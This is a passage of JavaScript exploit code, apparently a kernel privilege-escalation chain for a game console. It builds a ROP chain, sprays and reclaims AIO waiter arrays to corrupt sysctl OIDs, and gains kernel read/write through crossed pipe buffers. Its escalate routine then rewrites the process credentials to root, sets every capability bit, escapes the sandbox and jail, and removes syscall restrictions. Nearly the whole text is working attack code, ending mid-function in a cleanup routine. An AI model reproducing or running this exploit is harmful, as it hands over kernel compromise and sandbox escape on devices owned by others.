            write32(request + 0x20n, read_fd);
            const rv = sysnum(SYSCALL.aio_submit_cmd, AIO_CMD_READ, request, 1n, 3n, id_out);
            if (rv === 0n) return read32(id_out);
            return null;
        }

        function park_aio_workers(limit) {
            const pair = open_socket_pair("socketpair for the worker park failed");
            worker_park = pair;

            const ids = alloc(4 * limit + 8);
            const states = alloc(4 * limit + 8);

            let sent = 0, parked = 0, quiet_rounds = 0;
            while (sent < limit && quiet_rounds < 2) {
                for (let i = 0; i < 4 && sent < limit; i++) {
                    const id = submit_blocked_read(pair.read_fd);
                    if (id === null) return false;
                    write32(ids + BigInt(sent * 4), id);
                    sent++;
                }

                nanosleep(60 * 1e6);
                sysnum(SYSCALL.aio_multi_poll, ids, BigInt(sent), states);

                let in_flight = 0;
                for (let i = 0; i < sent; i++) {
                    if ((Number(read32(states + BigInt(i * 4))) & 0xffff) === 2) in_flight++;
                }

                if (in_flight === parked) quiet_rounds++;
                else { parked = in_flight; quiet_rounds = 0; }
            }
            return sent === limit && parked === limit;
        }

        function wait_for_pending_requests(candidate_ids, candidate_count, wanted_count) {
            const poll_id = alloc(4);
            const poll_state = alloc(4);
            const pending_indices = [];
            const seen = {};

            for (let attempt = 0; attempt < 150 && pending_indices.length < wanted_count; attempt++) {
                for (let index = 0; index < candidate_count && pending_indices.length < wanted_count; index++) {
                    if (seen[index]) continue;
                    write32(poll_id, read32(candidate_ids + BigInt(index * 4)));
                    sysnum(SYSCALL.aio_multi_poll, poll_id, 1n, poll_state);
                    if ((Number(read32(poll_state)) & 0xffff) === 1) {
                        pending_indices.push(index);
                        seen[index] = true;
                    }
                }
                if (pending_indices.length < wanted_count) nanosleep(20 * 1e6);
            }

            if (pending_indices.length !== wanted_count) {
                throw new Error(pending_indices.length + "/" + wanted_count + " requests stayed pending");
            }
            return pending_indices;
        }

        function claim_pending_requests(count) {
            const candidate_count = Math.max(count + 8, 0x18);
            const candidate_ids = alloc(4 * candidate_count);

            for (let index = 0; index < candidate_count; index++) {
                const pair = open_socket_pair("socketpair failed while claiming requests");
                const id = submit_blocked_read(pair.read_fd);
                if (id === null) throw new Error("aio request submission failed");
                write32(candidate_ids + BigInt(index * 4), id);
            }

            const pending = wait_for_pending_requests(candidate_ids, candidate_count, count);

            const ids = alloc(4 * count);
            pending.forEach((index, output) => {
                write32(ids + BigInt(output * 4), read32(candidate_ids + BigInt(index * 4)));
            });

            return { ids, count };
        }

        function build_waiter_nodes(count, first_target, second_target) {
            const request_size = Number(off.aio.requestSize);
            const nodes = alloc(count * request_size);
            for (let i = 0; i < count; i++) {
                write32(nodes + BigInt(i * request_size + 0x20), 0xffffffffn);
            }
            write64(nodes, first_target);
            write64(nodes + 8n, second_target);
            write64(nodes + 0x10n, kaddr(off.nodeMutex));
            return nodes;
        }

        function remember_armed_group(group) {
            const ids = [];
            for (let index = 0; index < group.count; index++) {
                ids.push(read32(group.ids + BigInt(index * 4)));
            }
            armed_groups.push(ids);
        }

        // use a private chain because the reclaim batch exceeds the engine buffer.

        const ROP_THREAD_TIMEOUT_MS = 20000;

        function chain_new() {
            return { entries: [] };
        }

        function chain_push(c, v) { c.entries.push(BigInt(v)); }

        // keep the reused syscall call site 16-byte aligned.
        function chain_align(c) {
            if (c.entries.length % 2 !== 0) chain_push(c, ROP.ret);
        }

        function chain_syscall(c, sysno, args) {
            const pops = [ROP.pop_rdi, ROP.pop_rsi, ROP.pop_rdx, ROP.pop_rcx, ROP.pop_r8, ROP.pop_r9];
            chain_push(c, ROP.pop_rax);
            chain_push(c, sysno);
            for (let i = 0; i < args.length; i++) {
                chain_push(c, pops[i]);
                chain_push(c, args[i]);
            }
            chain_align(c);
            chain_push(c, syscall_wrapper);
        }

        function chain_store_rax(c, addr) {
            chain_push(c, ROP.pop_rdi);
            chain_push(c, addr);
            chain_push(c, ROP.mov_qword_rdi_rax);
        }

        function chain_finish(c, flag_addr) {
            chain_push(c, ROP.pop_rdi);
            chain_push(c, flag_addr);
            chain_push(c, ROP.pop_rax);
            chain_push(c, 1n);
            chain_push(c, ROP.mov_qword_rdi_rax);
            chain_push(c, ROP.pop_rax);
            chain_push(c, SYSCALL.thr_exit);
            chain_push(c, ROP.pop_rdi);
            chain_push(c, 0n);
            chain_align(c);
            chain_push(c, syscall_wrapper);
        }

        // repeat the entry address for the unknown initial rsp.
        function run_chain(chain) {
            const flag_addr = alloc(8);
            write64(flag_addr, 0n);
            chain_finish(chain, flag_addr);

            const lead_in = 2;
            const qwords = lead_in + chain.entries.length;
            const buf = alloc(qwords * 8 + 0x20);
            const entry = (buf + 0x10n + 15n) & ~15n;

            write64(entry, ROP.ret);
            write64(entry + 8n, ROP.ret);
            for (let i = 0; i < chain.entries.length; i++) {
                write64(entry + BigInt((lead_in + i) * 8), chain.entries[i]);
            }

            const stack_size = 0x4000n, stack_size_arg = 0x2000n, tls_size = 0x40n;
            const thr_new_args = alloc(0x80);
            const tid_addr = alloc(8);
            const cpid = alloc(8);
            const stack = alloc(Number(stack_size));
            const tls = alloc(Number(tls_size));

            for (let i = 0n; i < 0x80n; i += 8n) write64(thr_new_args + i, 0n);
            for (let i = 0n; i < stack_size; i += 8n) write64(stack + i, entry);
            for (let i = 0n; i < tls_size; i += 8n) write64(tls + i, 0n);

            write64(thr_new_args + 0x00n, ROP.pop_rsp);
            write64(thr_new_args + 0x08n, 0n);
            write64(thr_new_args + 0x10n, stack);
            write64(thr_new_args + 0x18n, stack_size_arg);
            write64(thr_new_args + 0x20n, tls);
            write64(thr_new_args + 0x28n, tls_size);
            write64(thr_new_args + 0x30n, tid_addr);
            write64(thr_new_args + 0x38n, cpid);

            const result = sysnum(SYSCALL.thr_new, thr_new_args, 0x68n);
            if (result !== 0n) throw new Error("thr_new failed: " + toHex(result));

            const deadline = Date.now() + ROP_THREAD_TIMEOUT_MS;
            while (read64(flag_addr) !== 1n) {
                if (Date.now() > deadline) throw new Error("rop chain never finished - reboot the console");
                nanosleep(1000000);
            }
        }

        function run_reclaim_batch(group, nodes) {
            const requests = tuning.requests;
            const request_size = Number(off.aio.requestSize);
            const sprays = tuning.sprays;
            const sprayed_ids = alloc(4 * requests * (sprays + 1));
            const timeout = alloc(16);
            write32(timeout, BigInt(tuning.waitTimeoutUs));

            // invalid fd fails after the kernel copies this request.
            const churn_request = (0x80000000n | (BigInt(requests * request_size) << 16n) | 0x4101n) & 0xffffffffn;

            const preflight = sysnum(SYSCALL.ioctl, -1n, churn_request, nodes);
            if (preflight !== -1n) return null;

            const chain = chain_new();

            for (let i = 0; i < tuning.churnBefore; i++) {
                chain_syscall(chain, SYSCALL.ioctl, [-1n, churn_request, nodes]);
            }

            chain_syscall(chain, SYSCALL.aio_multi_wait, [group.ids, BigInt(group.count), scratch_states, 0n, timeout]);

            for (let i = 0; i < tuning.churnAfter; i++) {
                chain_syscall(chain, SYSCALL.ioctl, [-1n, churn_request, nodes]);
            }

            const retvals = alloc(8 * (sprays + 1));
            for (let i = 0; i < sprays; i++) {
                chain_syscall(chain, SYSCALL.aio_submit_cmd,
                    [AIO_CMD_READ, nodes, BigInt(requests), 3n, sprayed_ids + BigInt(i * 4 * requests)]);
                chain_store_rax(chain, retvals + BigInt(i * 8));
            }

            run_chain(chain);

            let accepted = 0;
            for (let i = 0; i < sprays; i++) {
                if (read32(retvals + BigInt(i * 8)) === 0n) accepted++;
            }
            return accepted;
        }

        function cancel_request(group, index) {
            return sysnum(SYSCALL.aio_multi_cancel, group.ids + BigInt(index * 4), 1n, scratch_states);
        }

        function first_pending_request(group) {
            sysnum(SYSCALL.aio_multi_poll, group.ids, BigInt(group.count), scratch_states);
            for (let index = 0; index < group.count; index++) {
                const state = Number(read32(scratch_states + BigInt(index * 4))) & 0xffff;
                if (state === 1) {
                    const canary = group.count - 1;
                    if (canary !== index) cancel_request(group, canary);
                    return index;
                }
            }
            return -1;
        }

        function reclaim_waiter_array(tag, first_target, second_target) {
            const group = claim_pending_requests(tuning.waiters);
            remember_armed_group(group);

            const nodes = build_waiter_nodes(tuning.requests, first_target, second_target);
            const accepted = run_reclaim_batch(group, nodes);
            if (accepted === null) { warn(tag + ": invalid churn request"); return null; }
            if (accepted !== tuning.sprays) {
                warn(tag + ": " + (tuning.sprays - accepted) + " reclaim submits failed");
                return null;
            }

            const first_pending = first_pending_request(group);
            if (first_pending < 0) { warn(tag + ": no pending request is available"); return null; }

            return { group, first_pending, heads: group.count - 1 };
        }

        function flip_oid_kind(tag, reclaim, mib, target) {
            let kind = oid_kind(mib);
            if (kind === null) { warn(tag + ": oid is hidden before the flip"); return false; }

            let i = 0;
            while (i < reclaim.heads && kind !== target) {
                cancel_request(reclaim.group, i);
                const next_kind = oid_kind(mib);
                if (next_kind === null) { warn(tag + ": oid disappeared during the flip"); return false; }
                kind = next_kind;
                if (((kind >> 24) & 0xff) < ((target >> 24) & 0xff)) {
                    warn(tag + ": oid flip overshot into oid_arg1");
                    return false;
                }
                i++;
            }
            if (kind !== target) { warn(tag + ": not enough waiter heads"); return false; }
            return true;
        }

        function make_oid_writable(tag, mib, kind_byte_rva) {
            const a = off.oid.a;
            const kind = oid_kind(mib);
            if (kind !== Number(off.oid.originalKind)) {
                warn(tag + ": unexpected oid kind " + (kind === null ? "missing" : kind.toString(16)));
                return false;
            }
            const reclaim = reclaim_waiter_array(tag, kaddr(a.deadSink), kaddr(kind_byte_rva));
            if (!reclaim) return false;
            return flip_oid_kind(tag, reclaim, mib, Number(off.oid.writableKind));
        }

        // slow kernel read/write

        function set_window_low(value) {
            return sysctl_write_int(mib_a, value);
        }

        function set_window_high(value) {
            if (mib_c) return sysctl_write_int(mib_c, value);
            if (window_high !== 0xffffffffn) return -1n;

            const self_high = kaddr(off.oid.b.arg1 + 4n);
            const rv = set_window_low(Number(self_high & 0xffffffffn));
            if (rv !== 0n) return rv;
            return sysctl_write_int(mib_b, value);
        }

        function aim_window(address) {
            const high = (address >> 32n) & 0xffffffffn;
            if (window_high !== high) {
                const rv = set_window_high(Number(high));
                if (rv !== 0n) return rv;
                window_high = high;
            }
            return set_window_low(Number(address & 0xffffffffn));
        }

        function kread32(address) {
            if (aim_window(address) !== 0n) return { rv: -1n, value: 0 };
            return sysctl_read_int(mib_b);
        }

        function kwrite32(address, value) {
            if (aim_window(address) !== 0n) return -1n;
            return sysctl_write_int(mib_b, value);
        }

        function kread64(address) {
            const lo = kread32(address);
            const hi = kread32(address + 4n);
            const rv = (lo.rv === 0n && hi.rv === 0n) ? 0n : -1n;
            return { rv, value: (BigInt(hi.value) << 32n) | BigInt(lo.value) };
        }

        function kwrite64(address, value) {
            const rv = kwrite32(address, Number(value & 0xffffffffn));
            if (rv !== 0n) return rv;
            return kwrite32(address + 4n, Number((value >> 32n) & 0xffffffffn));
        }

        function prepare_high_writer() {
            const c = off.oid.c, b = off.oid.b;
            if (window_high !== 0xffffffffn) {
                warn("kernel rw: writer window already left the kernel image");
                return false;
            }
            if (kwrite32(kaddr(c.kind), Number(off.oid.writableKind)) !== 0n) return false;
            if (kwrite64(kaddr(c.arg1), kaddr(b.arg1 + 4n)) !== 0n) return false;

            const probe = sysctl_read_int(c.mib);
            if (probe.rv !== 0n || probe.value !== 0xffffffff) {
                warn("kernel rw: high writer self-test failed");
                return false;
            }
            mib_c = c.mib;
            return true;
        }

        function steer_oid_window() {
            const a = off.oid.a, b = off.oid.b;
            if (oid_kind(mib_b) !== null) { warn("Kernel: oid is already visible"); return false; }

            const a_probe = sysctl_read_int(mib_a);
            if (a_probe.rv !== 0n) { warn("Kernel: steering oid is not readable"); return false; }

            const reclaim = reclaim_waiter_array("Kernel", kaddr(a.arg1Byte1), kaddr(b.visible));
            if (!reclaim) return false;

            cancel_request(reclaim.group, reclaim.first_pending);

            const steered = sysctl_read_int(mib_a);
            const expected = Number(kaddr(b.arg1Value) & 0xffffffffn);
            if (steered.rv !== 0n || steered.value !== expected) {
                warn("Kernel: oid steering check failed");
                return false;
            }

            window_high = 0xffffffffn;
            return true;
        }

        function test_kernel_read() {
            const b = off.oid.b;
            const kind_via_oidfmt = oid_kind(mib_b);
            const read = kread32(kaddr(b.kind));
            const ok = kind_via_oidfmt !== null && read.rv === 0n && read.value === kind_via_oidfmt;
            if (!ok) warn("Kernel: read self-test failed");
            return ok;
        }

        function test_kernel_write() {
            const counter = kaddr(off.walkCounter.addr);
            const mib = off.walkCounter.mib;
            const before = sysctl_read_int(mib);
            const rv = kwrite32(counter, 0x41424344);
            const after = sysctl_read_int(mib);
            const ok = rv === 0n && after.value === 0x41424344;
            if (ok) kwrite32(counter, before.value);
            else warn("Kernel: write self-test failed");
            return ok;
        }

        function arm_kernel_read_write() {
            const a = off.oid.a, b = off.oid.b;

            mib_a = name_to_mib("kern.smp.cpus");
            mib_b = name_to_mib("kern.smp.maxcpus");
            if (!mib_a || !mib_b || oid_kind(mib_a) !== Number(off.oid.originalKind)) {
                warn("Kernel: unexpected oid state");
                return false;
            }

            raise_fd_limit();
            park_aio_workers(tuning.workerBlockers);

            if (!make_oid_writable("arm a", mib_a, a.kindByte3)) return false;
            if (!steer_oid_window()) return false;
            if (!test_kernel_read()) return false;
            if (!make_oid_writable("arm c", mib_b, b.kindByte3)) return false;
            if (!test_kernel_write()) return false;

            return prepare_high_writer();
        }

        // process discovery

        function read_kernel_pointer_slow(address) {
            const { rv, value } = kread64(address);
            if (rv === 0n && is_kernel_pointer(value)) return value;
            return null;
        }

        function find_process(target_pid) {
            const head = read_kernel_pointer_slow(kaddr(off.allproc));
            if (!head) { warn("Process: allproc is not a kernel pointer"); return null; }

            let proc = head;
            for (let hop = 0; hop < 4096; hop++) {
                const pid_read = kread32(proc + off.proc.pid);
                if (pid_read.rv !== 0n) return null;
                const pid_value = BigInt.asIntN(32, BigInt(pid_read.value));
                if (pid_value < 0n || pid_value > 0x40000n) {
                    warn("Process: invalid pid while walking allproc");
                    return null;
                }
                if (pid_value === target_pid) return proc;

                const next_proc = read_kernel_pointer_slow(proc);
                if (!next_proc) return null;
                proc = next_proc;
            }
            return null;
        }

        function find_current_process() {
            const my_pid = sysnum(SYSCALL.getpid);
            const proc = find_process(my_pid);
            if (!proc) { warn("Process: current process is not in allproc"); return false; }
            curproc = proc;

            const fd_read = kread64(curproc + off.proc.fd);
            if (is_kernel_pointer(fd_read.value)) proc_fd_addr = fd_read.value;

            const aio_read = kread64(curproc + off.proc.aioInfo);
            const ucred_read = kread64(curproc + off.proc.ucred);
            if (is_kernel_pointer(ucred_read.value)) ucred_addr = ucred_read.value;

            const ok = aio_read.rv === 0n && is_kernel_pointer(aio_read.value);
            if (ok) ok_msg("aio_info_addr: " + toHex(aio_read.value));
            else warn("Process: aio info pointer is invalid");
            if (ucred_addr) ok_msg("ucred_addr: " + toHex(ucred_addr));
            return ok;
        }

        // fast kernel read/write

        function find_pipe(fdp, fd, label) {
            const table_addr = read_kernel_pointer_slow(fdp + off.filedesc.files);
            if (!table_addr) { warn("Pipes: " + label + " file table is invalid"); return null; }

            const count = kread32(table_addr + off.filedescTable.nfiles);
            if (count.rv !== 0n || fd >= BigInt(count.value)) {
                warn("Pipes: " + label + " descriptor is outside the file table");
                return null;
            }

            const entry = off.filedescTable.ofiles + fd * off.filedescTable.entryStride;
            const file_addr = read_kernel_pointer_slow(table_addr + entry);
            if (!file_addr) { warn("Pipes: " + label + " file pointer is invalid"); return null; }

            const pipe_addr = read_kernel_pointer_slow(file_addr + off.filedescTable.fileData);
            if (!pipe_addr) { warn("Pipes: " + label + " pipe pointer is invalid"); return null; }

            const pair = kread64(pipe_addr + off.pipe.pair);
            const is_read_end = pair.rv === 0n && pair.value === pipe_addr;

            return { file: file_addr, pipe: pipe_addr, is_read_end };
        }

        function locate_pipes() {
            const fdp = read_kernel_pointer_slow(curproc + off.proc.fd);
            if (!fdp) { warn("Pipes: process file table is invalid"); return false; }

            const probe = alloc(8);
            const located = [];

            for (const label of ["master", "victim"]) {
                const [read_fd, write_fd] = create_pipe();
                syscall(SYSCALL.fcntl, read_fd, F_SETFL, O_NONBLOCK);
                syscall(SYSCALL.fcntl, write_fd, F_SETFL, O_NONBLOCK);
                fds.push(read_fd, write_fd);

                const info = find_pipe(fdp, read_fd, label);
                if (!info) return false;
                if (!info.is_read_end) { warn("Pipes: " + label + " pipe self-check failed"); return false; }

                write32(probe, 0x5an);
                sysnum(SYSCALL.write, write_fd, probe, 1n);

                const count = kread32(info.pipe + off.pipe.count);
                if (count.value !== 1) { warn("Pipes: " + label + " pipe counter check failed"); return false; }

                const write_info = find_pipe(fdp, write_fd, label);
                if (!write_info) return false;

                located.push({ read_fd, write_fd, pipe: info.pipe, read_file: info.file, write_file: write_info.file });
            }

            master = located[0];
            victim = located[1];
            return true;
        }

        function aim_victim(address, count, size) {
            const C = off.pipe.count, S = off.pipe.size, B = off.pipe.buffer;
            for (let i = 0n; i < 0x18n; i += 4n) write32(aim_buffer + i, 0n);
            write32(aim_buffer + C, BigInt(count) & 0xffffffffn);
            write32(aim_buffer + S, BigInt(size) & 0xffffffffn);
            write64(aim_buffer + B, address);

            const written = sysnum(SYSCALL.write, master.write_fd, aim_buffer, 0x18n);
            const drained = sysnum(SYSCALL.read, master.read_fd, drain_buffer, 0x18n);
            return (written === 0x18n && drained === 0x18n) ? 0n : -1n;
        }

        function kread_fast(address, length, dest) {
            if (aim_victim(address, length, pipe_size) !== 0n) return -1n;
            return sysnum(SYSCALL.read, victim.read_fd, dest, BigInt(length));
        }

        function kwrite_fast(address, length, src) {
            if (aim_victim(address, 0, pipe_size) !== 0n) return -1n;
            return sysnum(SYSCALL.write, victim.write_fd, src, BigInt(length));
        }

        function read_kernel32(address) {
            if (kread_fast(address, 4, scratch_qword) === 4n) return read32(scratch_qword);
            return -1n;
        }

        function read_kernel64(address) {
            if (kread_fast(address, 8, scratch_qword) === 8n) return read64(scratch_qword);
            return 0n;
        }

        function read_kernel64_checked(address) {
            const rv = kread_fast(address, 8, scratch_qword);
            return { rv, value: rv === 8n ? read64(scratch_qword) : 0n };
        }

        function read_kernel32_checked(address) {
            const rv = kread_fast(address, 4, scratch_qword);
            return { rv, value: rv === 4n ? read32(scratch_qword) : 0n };
        }

        function write_kernel32(address, value) {
            write32(scratch_qword, BigInt(value) & 0xffffffffn);
            return kwrite_fast(address, 4, scratch_qword) === 4n;
        }

        function write_kernel64(address, value) {
            write64(scratch_qword, value);
            return kwrite_fast(address, 8, scratch_qword) === 8n;
        }

        function cross_pipes() {
            const master_pipe = master.pipe, victim_pipe = victim.pipe;
            const count_off = off.pipe.count, in_off = off.pipe["in"], out_off = off.pipe.out,
                size_off = off.pipe.size, buffer_off = off.pipe.buffer;

            pipe_size = off.pipe.defaultSize;
            aim_buffer = alloc(0x20);
            drain_buffer = alloc(0x40);

            const master_buf = kread64(master_pipe + buffer_off);
            const master_sz = kread32(master_pipe + size_off);
            const victim_buf = kread64(victim_pipe + buffer_off);
            const victim_sz = kread32(victim_pipe + size_off);
            if (master_buf.rv !== 0n || master_sz.rv !== 0n || victim_buf.rv !== 0n || victim_sz.rv !== 0n) {
                warn("Pipes: could not save the original pipe buffers");
                return false;
            }
            saved_pipe_buffers = {
                master: master_buf.value, master_size: master_sz.value,
                victim: victim_buf.value, victim_size: victim_sz.value,
            };

            const in_read = kread32(master_pipe + in_off);
            const out_read = kread32(master_pipe + out_off);
            if (in_read.rv !== 0n || in_read.value !== 1 || out_read.value !== 0) {
                warn("Pipes: master pipe is not in the expected state");
                return false;
            }
            sysnum(SYSCALL.read, master.read_fd, drain_buffer, 1n);

            const fields = [
                [count_off, 0], [in_off, 0], [out_off, 0],
                [size_off, Number(pipe_size)],
                [buffer_off, Number(victim_pipe & 0xffffffffn)],
                [buffer_off + 4n, Number((victim_pipe >> 32n) & 0xffffffffn)],
            ];
            crossed = true;
            for (const [offset, value] of fields) {
                let ok = false;
                for (let attempt = 0; attempt < 3 && !ok; attempt++) {
                    kwrite32(master_pipe + offset, value);
                    const read = kread32(master_pipe + offset);
                    ok = read.rv === 0n && read.value === value;
                }
                if (!ok) { warn("Pipes: could not update the master pipe"); return false; }
            }
            const rva = off.rodataProbe.rva, text = off.rodataProbe.text;
            const out = alloc(0x40);
            const got = kread_fast(kaddr(rva), text.length, out);
            const read_back = new TextDecoder().decode(read_buffer(out, text.length));

            const match = got === BigInt(text.length) && read_back === text;
            if (!match) warn("Pipes: kernel read check failed");
            return match;
        }

        // privileges

        function escalate() {
            if (!crossed || !ucred_addr) { warn("Privileges: kernel rw or credentials are missing"); return false; }

            const rootvnode = read_kernel_pointer_slow(kaddr(off.rootvnode));
            if (!rootvnode) { warn("Privileges: could not find rootvnode"); return false; }

            const ucred = off.ucred, sysCoreAuthId = off.sysCoreAuthId, filedesc = off.filedesc,
                dynlib = off.dynlib, proc = off.proc;
            const cred = ucred_addr;

            write_kernel32(cred + ucred.uid, 0);
            write_kernel32(cred + ucred.ruid, 0);
            write_kernel32(cred + ucred.svuid, 0);
            write_kernel32(cred + ucred.ngroups, 1);
            write_kernel32(cred + ucred.rgid, 0);
            write_kernel32(cred + ucred.svgid, 0);
            write_kernel64(cred + ucred.sceAuthId, (sysCoreAuthId.hi << 32n) | sysCoreAuthId.lo);
            write_kernel64(cred + ucred.sceCaps, 0xffffffffffffffffn);
            write_kernel64(cred + ucred.sceCaps1, 0xffffffffffffffffn);

            const attrs_low = read_kernel32(cred + ucred.sceAttrs);
            const attrs_high = read_kernel32(cred + ucred.sceAttrs + 4n);
            const new_low = (attrs_low & 0x00ffffffn) | 0x80000000n;
            write_kernel64(cred + ucred.sceAttrs, (attrs_high << 32n) | new_low);

            const fdp = kread64(curproc + proc.fd);
            const orig_jdir = kread64(fdp.value + filedesc.jdir);
            write_kernel64(fdp.value + filedesc.cdir, rootvnode);
            write_kernel64(fdp.value + filedesc.rdir, rootvnode);
            write_kernel64(fdp.value + filedesc.jdir, 0n);

            let orig_dynlib = null;
            const dynlib_read = kread64(curproc + proc.dynlib);
            if (is_kernel_pointer(dynlib_read.value)) {
                const dynlib_ptr = dynlib_read.value;
                orig_dynlib = {
                    ptr: dynlib_ptr,
                    syscallStart: kread64(dynlib_ptr + dynlib.syscallStart),
                    syscallEnd: kread64(dynlib_ptr + dynlib.syscallEnd),
                    restrictFlags: kread32(dynlib_ptr + dynlib.restrictFlags),
                    libkernelRef: kread64(dynlib_ptr + dynlib.libkernelRef),
                };
            }
            orig_escalation = { fdp: fdp.value, jdir: orig_jdir, dyn: orig_dynlib };
            if (is_kernel_pointer(dynlib_read.value)) {
                const dynlib_ptr = dynlib_read.value;
                const dynlib_ok = write_kernel64(dynlib_ptr + dynlib.syscallStart, 0n) &&
                    write_kernel64(dynlib_ptr + dynlib.syscallEnd, 0xffffffffffffffffn) &&
                    write_kernel32(dynlib_ptr + dynlib.restrictFlags, 0) &&
                    write_kernel64(dynlib_ptr + dynlib.libkernelRef, 1n) &&
                    read_kernel64_checked(dynlib_ptr + dynlib.syscallStart).rv === 8n &&
                    read_kernel64_checked(dynlib_ptr + dynlib.syscallStart).value === 0n &&
                    read_kernel64_checked(dynlib_ptr + dynlib.syscallEnd).rv === 8n &&
                    read_kernel64_checked(dynlib_ptr + dynlib.syscallEnd).value === 0xffffffffffffffffn &&
                    read_kernel32_checked(dynlib_ptr + dynlib.restrictFlags).rv === 4n &&
                    read_kernel32_checked(dynlib_ptr + dynlib.restrictFlags).value === 0n &&
                    read_kernel64_checked(dynlib_ptr + dynlib.libkernelRef).rv === 8n &&
                    read_kernel64_checked(dynlib_ptr + dynlib.libkernelRef).value === 1n;

                // dlsym validates the caller against eboot segment bounds.
                const eboot_read = kread64(dynlib_ptr);
                if (is_kernel_pointer(eboot_read.value)) {
                    const segments_read = kread64(eboot_read.value + 0x40n);
                    if (is_kernel_pointer(segments_read.value)) {
                        const orig_addr = kread64(segments_read.value + 0x08n);
                        const orig_size = kread64(segments_read.value + 0x10n);
                        if (orig_addr.rv === 0n && orig_size.rv === 0n) {
                            eboot_segments_ptr = segments_read.value;
                            eboot_orig_addr = orig_addr.value;
                            eboot_orig_size = orig_size.value;
                        }
                        const wrote = orig_addr.rv === 0n && orig_size.rv === 0n &&
                            write_kernel64(segments_read.value + 0x08n, 0n) &&
                            write_kernel64(segments_read.value + 0x10n, 0xffffffffffffffffn);
                        const check_addr = read_kernel64_checked(segments_read.value + 0x08n);
                        const check_size = read_kernel64_checked(segments_read.value + 0x10n);
                        handoff_ready = dynlib_ok && wrote &&
                            check_addr.rv === 8n && check_addr.value === 0n &&
                            check_size.rv === 8n && check_size.value === 0xffffffffffffffffn;
                        if (!handoff_ready) {
                            warn("Privileges: dlsym state could not be verified");
                        }
                    }
                }
            } else {
                warn("Privileges: dynlib pointer is invalid");
            }

            const uid_after = sysnum(SYSCALL.getuid);
            const sandbox_after = sysnum(SYSCALL.is_in_sandbox);
            const ok = uid_after === 0n && sandbox_after === 0n;
            if (!ok) warn("Privileges: uid or sandbox check failed");
            return ok;
        }

        // aio cleanup

        function lookup_aio_group(table_addr, id) {
            const idTable = off.aio.idTable;
            const index = id & 0x1fff;

            const page_count = kread32(table_addr + idTable.pages);
            if (page_count.rv !== 0n || page_count.value === 0 || page_count.value > 64) return null;
            if (index >= (page_count.value << 7)) return null;

            const page = read_kernel_pointer_slow(table_addr + BigInt(index >> 7) * 8n);
            if (!page) return null;

            const slot = page + BigInt(index & 0x7f) * idTable.slotStride;

            const generation = kread32(slot + 0x28n);
            if (generation.rv !== 0n) return null;
            const combined = (((generation.value & 0xffff) << 13) | index) & 0xffff;
            if (combined !== id) return null;

            const state = kread32(slot + 0x24n);
            if (state.rv !== 0n || (state.value >>> 16) !== 3) return null;

            const entry_type = kread32(slot + 0x20n);
            if (entry_type.rv !== 0n || (entry_type.value & 0xffff) !== Number(idTable.entryType)) return null;

            return read_kernel_pointer_slow(slot + 0x10n);
        }

        function defuse_aio_groups() {
            if (!curproc) { warn("cleanup: current process is missing"); return false; }

            const table_addr = kread64(curproc + off.proc.aioInfo);
            if (!is_kernel_pointer(table_addr.value)) { warn("cleanup: aio table pointer is invalid"); return false; }

            const num_off = off.aio.group.num, state_off = off.aio.group.state, waiters_off = off.aio.group.waiters;
            let total = 0, already_clear = 0, cleared = 0, skipped = 0, failed = 0;

            for (const ids of armed_groups) {
                for (const id of ids) {
                    total++;
                    const group = lookup_aio_group(table_addr.value, Number(id));
                    if (!group) { skipped++; continue; }

                    const shared = read_kernel_pointer_slow(group + 0x10n);
                    if (!shared) { skipped++; continue; }

                    const group_num = kread32(shared + num_off);
                    const group_state = kread32(shared + state_off);
                    if (group_num.value !== 1 || group_state.value < 1 || group_state.value > 4) { skipped++; continue; }

                    const head = kread64(shared + waiters_off);
                    if (head.value === 0n) { already_clear++; continue; }

                    let ok = false;
                    for (let attempt = 0; attempt < 3 && !ok; attempt++) {
                        kwrite32(shared + waiters_off, 0);
                        kwrite32(shared + waiters_off + 4n, 0);
                        const back = kread64(shared + waiters_off);
                        ok = back.value === 0n;
                    }
                    if (ok) cleared++; else failed++;
                }
            }

            const ok = skipped === 0 && failed === 0 && (cleared + already_clear) === total;
            if (!ok) warn("cleanup: aio cleanup failed (" + skipped + " skipped, " + failed + " failed)");
            return ok;
        }

        // restore

        function restore_eboot_segments() {
            if (!eboot_segments_ptr) return true;
            const addr = eboot_segments_ptr + 0x08n;
            const size = eboot_segments_ptr + 0x10n;
            const wrote = write_kernel64(addr, eboot_orig_addr) &&
                write_kernel64(size, eboot_orig_size);
            const addr_chk = read_kernel64_checked(addr);
            const size_chk = read_kernel64_checked(size);
            const ok = wrote && addr_chk.rv === 8n && size_chk.rv === 8n &&
                addr_chk.value === eboot_orig_addr && size_chk.value === eboot_orig_size;
            if (ok) eboot_segments_ptr = 0n;
            else warn("Cleanup: eboot segment restore failed");
            return ok;
        }

        function restore_pipes() {
            if (!crossed) return true;
            if (!saved_pipe_buffers) {
                warn("Cleanup: original pipe buffers were not saved; pipes remain armed");
                return false;
            }

            const buffer_off = off.pipe.buffer, size_off = off.pipe.size;
            let writes_ok = true;
            for (const [pipe, buffer, size] of [
                [master.pipe, saved_pipe_buffers.master, saved_pipe_buffers.master_size],
                [victim.pipe, saved_pipe_buffers.victim, saved_pipe_buffers.victim_size],
            ]) {
                writes_ok = kwrite64(pipe + buffer_off, buffer) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + size_off, size) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + off.pipe.count, 0) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + off.pipe["in"], 0) === 0n && writes_ok;
                writes_ok = kwrite32(pipe + off.pipe.out, 0) === 0n && writes_ok;
            }

            const master_chk = kread64(master.pipe + buffer_off);
            const victim_chk = kread64(victim.pipe + buffer_off);
            const master_sz_chk = kread32(master.pipe + size_off);
            const victim_sz_chk = kread32(victim.pipe + size_off);
            const ring_checks = [
                kread32(master.pipe + off.pipe.count), kread32(master.pipe + off.pipe["in"]),
                kread32(master.pipe + off.pipe.out), kread32(victim.pipe + off.pipe.count),
                kread32(victim.pipe + off.pipe["in"]), kread32(victim.pipe + off.pipe.out),
            ];
            const ok = writes_ok && master_chk.rv === 0n && victim_chk.rv === 0n &&
                master_sz_chk.rv === 0n && victim_sz_chk.rv === 0n &&
                master_chk.value === saved_pipe_buffers.master &&
                victim_chk.value === saved_pipe_buffers.victim &&
                master_sz_chk.value === saved_pipe_buffers.master_size &&
                victim_sz_chk.value === saved_pipe_buffers.victim_size &&
                ring_checks.every(check => check.rv === 0n && check.value === 0);

            if (ok) {
                crossed = false;
                ok_msg("original pipe buffers restored and verified");
            } else {
                warn("Cleanup: pipe restoration failed; pipes may panic on close");
            }
            return ok;
        }

        function disarm_pipes() {
            if (!crossed) return true;

